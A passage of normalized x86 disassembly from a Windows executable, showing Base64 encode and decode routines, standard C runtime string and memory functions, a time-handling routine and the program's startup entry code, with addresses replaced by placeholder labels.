and ecx 0xff
shr ecx 0x2
and ecx 0x3f
push ecx
call sub_4054b0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx ] al
mov eax [ ebp - 0x30 ]
and eax 0xff
shl eax 0x6
shr eax 0x2
mov ecx [ ebp - 0x30 ]
shr ecx 0x8
and ecx 0xff
shr ecx 0x4
or eax ecx
and eax 0x3f
push eax
call sub_4054b0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
cmp [ ebp - 0x28 ] 0x1
jle r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x30 ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov [ ebp - 0x31 ] 0x3d
mov eax [ ebp - 0x30 ]
shr eax 0x8
and eax 0xff
shl eax 0x4
shr eax 0x2
mov ecx [ ebp - 0x30 ]
shr ecx 0x10
and ecx 0xff
shr ecx 0x6
or eax ecx
and eax 0x3f
push eax
call sub_4054b0
add esp 0x4
mov [ ebp - 0x31 ] al
jmp r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x32 ] 0x3d
mov ecx [ ebp - 0x30 ]
shr ecx 0x10
and ecx 0xff
shl ecx 0x2
shr ecx 0x2
and ecx 0x3f
push ecx
call sub_4054b0
add esp 0x4
mov [ ebp - 0x32 ] al
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov al [ ebp - 0x31 ]
mov [ edx + 0x2 ] al
cmp [ ebp - 0x28 ] 0x2
jle r-xdata
mov edx [ ebp - 0x4 ]
mov al [ ebp - 0x32 ]
mov [ edx + 0x3 ] al
mov ecx [ ebp - 0x4 ]
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x4
mov [ ebp - 0xc ] edx
sub_4054b0
push ebp
mov ebp esp
sub esp 0x44
push esi
push edi
mov ecx 0x10
mov esi rw-data
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov al 0x3d
cmp [ ebp + 0x8 ] 0x40
jge r-xdata
mov eax [ ebp + 0x8 ]
mov al [ ebp + eax - 0x44 ]
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4054f0
push ebp
mov ebp esp
sub esp 0x38
push esi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_405b40
add esp 0x4
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x4
cmp [ ebp - 0x8 ] ecx
jge r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
and ecx 0xff
push ecx
call sub_4057f0
add esp 0x4
mov esi eax
shl esi 0x2
mov edx [ ebp - 0x18 ]
shr edx 0x8
and edx 0xff
push edx
call sub_4057f0
add esp 0x4
shl eax 0x2
sar eax 0x6
or esi eax
and esi 0xff
mov [ ebp - 0x1c ] esi
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
push eax
call sub_4057f0
add esp 0x4
mov esi eax
shl esi 0x4
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
and ecx 0xff
push ecx
call sub_4057f0
add esp 0x4
shl eax 0x2
sar eax 0x4
or esi eax
and esi 0xff
mov [ ebp - 0x20 ] esi
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
push edx
call sub_4057f0
add esp 0x4
mov esi eax
shl esi 0x6
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0xff
push eax
call sub_4057f0
add esp 0x4
shl eax 0x2
sar eax 0x2
or esi eax
and esi 0xff
mov [ ebp - 0x14 ] esi
mov ecx [ ebp - 0x20 ]
shl ecx 0x8
mov edx [ ebp - 0x1c ]
or edx ecx
mov eax [ ebp - 0x14 ]
shl eax 0x10
or edx eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] edx
mov edx [ ebp - 0x10 ]
add edx 0x4
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x3
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov eax [ ebp - 0xc ]
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x24 ]
jge r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0xff
push ecx
call sub_4057f0
add esp 0x4
mov esi eax
shl esi 0x2
mov edx [ ebp - 0x2c ]
shr edx 0x8
and edx 0xff
push edx
call sub_4057f0
add esp 0x4
shl eax 0x2
sar eax 0x6
or esi eax
and esi 0xff
mov [ ebp - 0x30 ] esi
mov eax [ ebp - 0x4 ]
mov cl [ ebp - 0x30 ]
mov [ eax ] cl
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x2c ]
shr ecx 0x8
and ecx 0xff
cmp ecx 0x3d
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x2c ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x10
and eax 0xff
cmp eax 0x3d
je r-xdata
mov edx [ ebp - 0x2c ]
shr edx 0x10
and edx 0xff
cmp edx 0x3d
je r-xdata
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp - 0x2c ]
shr ecx 0x18
and ecx 0xff
cmp ecx 0x3d
je r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x8
and eax 0xff
push eax
call sub_4057f0
add esp 0x4
mov esi eax
shl esi 0x4
mov ecx [ ebp - 0x2c ]
shr ecx 0x10
and ecx 0xff
push ecx
call sub_4057f0
add esp 0x4
shl eax 0x2
sar eax 0x4
or esi eax
and esi 0xff
mov [ ebp - 0x34 ] esi
mov edx [ ebp - 0x4 ]
mov al [ ebp - 0x34 ]
mov [ edx ] al
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x2c ]
shr edx 0x10
and edx 0xff
push edx
call sub_4057f0
add esp 0x4
mov esi eax
shl esi 0x6
mov eax [ ebp - 0x2c ]
shr eax 0x18
and eax 0xff
push eax
call sub_4057f0
add esp 0x4
shl eax 0x2
sar eax 0x2
or esi eax
and esi 0xff
mov [ ebp - 0x38 ] esi
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x38 ]
mov [ ecx ] dl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_4057f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0xffffffff
movsx eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x5a
jg r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x30
jl r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x7a
jg r-xdata
movsx edx [ ebp + 0x8 ]
sub edx 0x1d
mov [ ebp - 0x4 ] edx
jmp r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x2b
jne r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x39
jg r-xdata
movsx edx [ ebp + 0x8 ]
sub edx 0x57
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x2f
jne r-xdata
mov [ ebp - 0x4 ] 0x3e
jmp r-xdata
movsx edx [ ebp + 0x8 ]
sub edx 0x30
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x3f
sub_4058b7
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_406333
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_406333
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_405950
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_405960
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_405a40
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_405b40
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_405bea
push ebp
mov ebp esp
sub esp 0xcc
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x16 ]
cmp ax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0xcc ]
push eax
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp - 0x18 ]
cmp ax [ rw-data ]
jne r-xdata
or eax 0xffffffff
cmp eax 0x2
jne r-xdata
mov ax [ ebp - 0x1a ]
cmp ax [ rw-data ]
jne r-xdata
leave
retn
mov [ ecx ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x32 ] 0x0
je r-xdata
mov ax [ ebp - 0x1e ]
cmp ax [ rw-data ]
jne r-xdata
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ rw-data ] eax
pop esi
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ax [ ebp - 0x20 ]
cmp ax [ rw-data ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
call sub_4064b2
mov ecx [ ebp + 0x8 ]
add esp 0x1c
test ecx ecx
je r-xdata
sub_405cd0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_405d28
push ebx
push esi
mov esi rw-data
push edi
push esi
push 0x1
call sub_40665f
push esi
call sub_4066d4
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_40678b
push esi
push edi
mov ebx eax
call sub_406761
push esi
push 0x1
call sub_4066b1
add esp 0x28
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_405d70
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_405da0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_405e30
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405e90 ]
jmp [ ecx * 4 + jump_table_405f0c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f78 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405f78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_406110 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406018 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406110 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406110 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406110 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406110 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406110 ]
sub_406170
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_4061a5
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0x49
push eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
call sub_405b40
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
push eax
call sub_407140
add esp 0x10
leave
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_4084d5
pop ecx
test eax eax
jne r-xdata
call sub_4063e4
test eax eax
jne r-xdata
push 0x1c
call sub_40630f
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_408319
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4081e7
mov [ rw-data ] eax
call sub_407f9a
call sub_407ee1
call sub_407bf1
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_407e89
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_40630f
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_404130
mov [ ebp - 0x60 ] eax
push eax
call sub_407c1e
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_407d11
pop ecx
pop ecx
retn
sub_406333
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_408870
